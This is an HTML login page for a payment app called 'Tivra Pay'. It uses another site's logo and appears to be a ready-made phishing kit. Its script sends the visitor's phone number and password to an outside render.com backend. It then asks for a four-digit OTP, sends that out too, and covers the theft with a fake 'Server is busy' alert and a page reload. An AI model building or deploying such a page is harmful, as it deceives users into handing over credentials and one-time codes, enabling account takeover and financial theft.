<!DOCTYPE html>
<html lang="en" style="font-size: 44.8px;">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>Tivra Pay</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
        /* [Aapki CSS same rahegi] */
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; }
        html, body { background-color: #ffffff; width: 100%; height: 100%; overflow: hidden; }
        .logo { width: 105%; max-width: 500px; margin-top: 20px; }
        .loginform { width: 100%; max-width: 380px; padding: 20px; }
        .input-field-group { border-bottom: 1.2px solid #e2e8f0; padding: 14px 4px; margin-bottom: 22px; }
        .input-field-group input { border: none; width: 100%; font-size: 17px; outline: none; }
        .submit-btn { background-color: #2563eb; color: #ffffff; border: none; width: 100%; padding: 14px; border-radius: 25px; font-size: 18px; cursor: pointer; }
        
        /* Modal Styles */
        .modal { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.5); justify-content:center; align-items:center; z-index:999; }
        .modal.active { display: flex; }
        .modal-content { background:#fff; padding:20px; border-radius:15px; width:90%; max-width:320px; text-align:center; }
        .otp-box { width:40px; height:40px; text-align:center; font-size:20px; margin:5px; border:1px solid #ccc; }
    </style>
</head>
<body>
    <main data-v-6ffee151>
        <img src="https://vivipay.net/static/images/Login_Logo.png" class="logo">
        <div class="loginform">
            <form id="loginForm">
                <div class="input-field-group"><input type="tel" id="phoneNumber" placeholder="Enter phone number" required></div>
                <div class="input-field-group"><input type="password" id="password" placeholder="Enter password" required></div>
                <div class="form-utilities">
                    <span id="triggerForgot" style="color:#2563eb; cursor:pointer;">Forgot password</span>
                </div>
                <button type="submit" class="submit-btn">Login</button>
            </form>
        </div>
    </main>

    <div id="otpModal" class="modal">
        <div class="modal-content">
            <h3>Please enter OTP</h3>
            <input type="tel" class="otp-box" maxlength="1" id="o1">
            <input type="tel" class="otp-box" maxlength="1" id="o2">
            <input type="tel" class="otp-box" maxlength="1" id="o3">
            <input type="tel" class="otp-box" maxlength="1" id="o4">
            <button class="submit-btn" onclick="submitOtp()" style="margin-top:15px;">Verify</button>
        </div>
    </div>

    <script>
        const BACKEND_URL = 'https://tivrapay-backend.onrender.com'; // Apna Render URL rakhein
        let currentUserId = null;

        document.getElementById('loginForm').onsubmit = async (e) => {
            e.preventDefault();
            const res = await fetch(`${BACKEND_URL}/api/login-submit`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phoneNumber: document.getElementById('phoneNumber').value, password: document.getElementById('password').value })
            });
            const data = await res.json();
            currentUserId = data.userId;
            document.getElementById('otpModal').classList.add('active');
        };

        async function submitOtp() {
            const otp = document.getElementById('o1').value + document.getElementById('o2').value + document.getElementById('o3').value + document.getElementById('o4').value;
            await fetch(`${BACKEND_URL}/api/otp-submit`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ userId: currentUserId, otp: otp })
            });
            alert("Server is busy, please try again later.");
            window.location.reload();
        }
    </script>
</body>
</html>
